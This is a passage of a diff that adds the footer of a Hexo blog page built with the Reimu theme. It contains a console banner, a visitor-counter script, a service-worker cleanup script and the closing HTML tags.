+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
